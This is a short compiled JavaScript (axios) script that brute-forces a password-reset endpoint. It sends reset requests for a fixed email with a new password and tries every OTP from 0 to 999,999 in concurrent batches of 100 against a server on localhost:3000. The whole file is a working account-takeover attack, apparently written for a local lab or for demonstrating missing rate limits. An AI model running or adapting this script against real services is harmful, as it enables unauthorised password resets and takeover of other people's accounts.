import axios from "axios";
async function sendRequest(otp) {
    try {
        await axios.post("http://localhost:3000/reset-password", {
            email: "xyz@gmail.com",
            otp: otp,
            newPassword: "xyzjjjj",
        }, {
            headers: {
                "Content-Type": "application/json",
            },
        });
    }
    catch (error) {
        console.log("🚀 ~ sendRequest ~ error:", error);
    }
}
async function main() {
    for (let i = 0; i < 1000000; i += 100) {
        const promises = [];
        console.log("here for " + i);
        for (let j = 0; j < 100; j++) {
            promises.push(sendRequest(i + j));
        }
        await Promise.all(promises);
    }
}
main();
//# sourceMappingURL=index.js.map